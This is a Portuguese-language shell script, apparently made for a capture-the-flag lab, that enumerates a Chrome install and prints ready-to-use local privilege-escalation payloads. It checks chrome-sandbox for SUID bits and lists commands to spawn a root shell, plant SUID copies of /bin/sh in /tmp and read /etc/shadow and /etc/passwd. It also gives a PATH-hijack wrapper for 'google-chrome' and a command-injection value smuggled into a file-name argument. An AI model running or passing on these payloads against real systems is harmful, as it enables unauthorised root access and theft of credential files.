# Root
#!/bin/sh
# chrome_payload_tester.sh - Focado apenas em testar payloads vulneráveis
# Usuário sem sudo, apt, root. Laboratório mínimo.

echo "[*] Chrome Payload Tester - Usuário Limitado"
echo "[*] Foco: Testar payloads, não buscar flags"
echo ""

# =====================================
# 1. VERIFICAÇÃO RÁPIDA DO SISTEMA
# =====================================
echo "[1] Sistema:"
id
echo "PATH: $PATH"
echo ""

# =====================================
# 2. LOCALIZAR CHROME E SANDBOX
# =====================================
echo "[2] Localizando Chrome:"

CHROME_PATH=""
SANDBOX_PATH=""

# Método 1: PATH padrão
if command -v google-chrome-stable >/dev/null 2>&1; then
    CHROME_PATH=$(command -v google-chrome-stable)
    echo "[+] Chrome no PATH: $CHROME_PATH"
fi

# Método 2: Local comum
for path in "/opt/google/chrome/chrome" "/usr/bin/google-chrome" "/usr/bin/chromium"; do
    if [ -x "$path" ]; then
        CHROME_PATH="$path"
        echo "[+] Chrome executável: $CHROME_PATH"
        break
    fi
done

# Localizar sandbox
for path in "/opt/google/chrome/chrome-sandbox" "/usr/lib/chromium/chrome-sandbox"; do
    if [ -x "$path" ]; then
        SANDBOX_PATH="$path"
        echo "[+] Sandbox encontrado: $SANDBOX_PATH"
        break
    fi
done

if [ -z "$CHROME_PATH" ] && [ -z "$SANDBOX_PATH" ]; then
    echo "[-] Chrome não encontrado"
    exit 0
fi

echo ""

# =====================================
# 3. TESTAR PERMISSÕES DO SANDBOX
# =====================================
echo "[3] Testando permissões do sandbox:"

if [ -n "$SANDBOX_PATH" ]; then
    # Verificar SUID
    PERMS=$(ls -la "$SANDBOX_PATH" 2>/dev/null | awk '{print $1}')
    echo "Permissões: $PERMS"
    
    if echo "$PERMS" | grep -q '^...s'; then
        echo "[VULN] SANDBOX COM SUID ATIVO"
        echo "       ↑↑↑ PRINCIPAL VETOR DE ESCALAÇÃO ↑↑↑"
    fi
    
    if echo "$PERMS" | grep -q '^......s'; then
        echo "[VULN] SANDBOX COM SGID ATIVO"
    fi
    
    # Verificar se podemos executar
    if [ -x "$SANDBOX_PATH" ]; then
        echo "[+] Podemos executar o sandbox"
    fi
fi

echo ""

# =====================================
# 4. TESTAR PAYLOADS DIRETOS
# =====================================
echo "[4] TESTANDO PAYLOADS DIRETOS:"
echo "--------------------------------"

# Payload 1: SUID básico (se existir)
if [ -n "$SANDBOX_PATH" ] && ls -la "$SANDBOX_PATH" 2>/dev/null | grep -q '^...s'; then
    echo "[PAYLOAD 1] SUID básico:"
    echo "  $ $SANDBOX_PATH /bin/sh -c 'id'"
    timeout 2 "$SANDBOX_PATH" /bin/sh -c 'echo "[TEST] UID: $UID, EUID: $EUID"' 2>&1 | grep -v "^$"
    echo ""
fi

# Payload 2: --command flag
echo "[PAYLOAD 2] Flag --command:"
echo "  $ $SANDBOX_PATH --command='id'"
timeout 2 "$SANDBOX_PATH" --help 2>&1 | grep -q "\-\-command" && echo "  [OK] Suporta --command"
timeout 2 "$SANDBOX_PATH" --help 2>&1 | grep -q "\-\-exec" && echo "  [OK] Suporta --exec"
echo ""

# Payload 3: Variáveis de ambiente
echo "[PAYLOAD 3] Variáveis de ambiente:"
echo "  $ CHROME_CMD='id' $SANDBOX_PATH"
env | grep -i chrome | while read var; do
    echo "  [ENV] $var"
done
echo ""

# Payload 4: Argument injection
echo "[PAYLOAD 4] Testando argumentos:"
if [ -n "$CHROME_PATH" ]; then
    echo "  Testando flags comuns..."
    for flag in "--no-sandbox" "--headless" "--disable-gpu" "--remote-debugging-port"; do
        timeout 1 "$CHROME_PATH" "$flag" --help 2>&1 | grep -q "unknown" || echo "  [OK] Aceita $flag"
    done
fi
echo ""

# =====================================
# 5. TESTAR SCRIPTS/CRON VULNERÁVEIS
# =====================================
echo "[5] Buscando scripts vulneráveis:"

# Buscar scripts que usam chrome
echo "  Buscando em /usr/local/bin:"
for script in /usr/local/bin/*; do
    if [ -f "$script" ] && [ -r "$script" ]; then
        if head -20 "$script" 2>/dev/null | grep -q -i "chrome\|chromium"; then
            echo "  [SCRIPT] $script"
            head -5 "$script" 2>/dev/null | grep -v "^#" | head -2
        fi
    fi
done

# Verificar se temos acesso a cron jobs
echo ""
echo "  Cron do usuário atual:"
crontab -l 2>/dev/null | grep -i chrome 2>/dev/null && echo "  [VULN] Chrome no seu crontab"

# Verificar cron.d (se pudermos ler)
if [ -r "/etc/crontab" ]; then
    grep -i chrome /etc/crontab 2>/dev/null && echo "  [VULN] Chrome no /etc/crontab"
fi

echo ""

# =====================================
# 6. TESTAR PATH HIJACKING
# =====================================
echo "[6] Testando PATH hijacking:"

# Verificar como scripts chamam chrome
if [ -n "$CHROME_PATH" ]; then
    CHROME_CALL=$(basename "$CHROME_PATH")
    echo "  Chrome é chamado como: $CHROME_CALL"
    echo "  Se scripts usarem '$CHROME_CALL' sem path absoluto,"
    echo "  podemos fazer PATH hijacking"
fi

echo ""

# =====================================
# 7. PAYLOADS DE EXPLORAÇÃO PRONTOS
# =====================================
echo "[7] PAYLOADS PARA EXPLORAÇÃO MANUAL:"
echo "======================================"

if [ -n "$SANDBOX_PATH" ]; then
    # Se sandbox tem SUID
    if ls -la "$SANDBOX_PATH" 2>/dev/null | grep -q '^...s'; then
        cat << EOF

[PAYLOAD SUID - Shell root]
$ $SANDBOX_PATH /bin/sh -p

[PAYLOAD SUID - Copiar shell]
$ $SANDBOX_PATH /bin/sh -c 'cp /bin/sh /tmp/rootshell; chmod 4777 /tmp/rootshell'

[PAYLOAD SUID - Ler arquivos]
$ $SANDBOX_PATH /bin/sh -c 'cat /etc/shadow 2>/dev/null | head -1'
EOF
    fi
    
    # Se não tem SUID mas podemos executar
    cat << EOF

[PAYLOAD BÁSICO - Teste]
$ $SANDBOX_PATH /bin/sh -c 'id'

[PAYLOAD ENV - Com variável]
$ CHROME_CMD='id' $SANDBOX_PATH

[PAYLOAD COM --command]
$ $SANDBOX_PATH --command='id' 2>/dev/null
EOF
fi

if [ -n "$CHROME_PATH" ]; then
    cat << EOF

[PAYLOAD CHROME - Flags perigosas]
$ $CHROME_PATH --no-sandbox --headless --dump-dom file:///etc/passwd

[PAYLOAD CHROME - Debug]
$ $CHROME_PATH --remote-debugging-port=9222 --headless &
$ curl http://localhost:9222/json 2>/dev/null
EOF
fi

cat << EOF

[PAYLOAD PATH HIJACK]
$ mkdir /tmp/exploit
$ echo '#!/bin/sh' > /tmp/exploit/google-chrome
$ echo 'cp /bin/sh /tmp/rsh; chmod 4777 /tmp/rsh' >> /tmp/exploit/google-chrome  
$ echo 'exec $CHROME_PATH "\$@"' >> /tmp/exploit/google-chrome
$ chmod +x /tmp/exploit/google-chrome
$ PATH=/tmp/exploit:\$PATH
$ # Executar qualquer script que chame 'google-chrome'

[PAYLOAD COMMAND INJECTION]
Para scripts que fazem: chrome --output=\$FILE
Use: FILE="normal;cp /bin/sh /tmp/s;chmod 4777 /tmp/s;#"
EOF

echo ""
echo "[*] Testes completos. Use os payloads acima manualmente."
echo "[*] Para escalar: 1) Execute payload 2) Verifique se ganhou root 3) Busque flags"
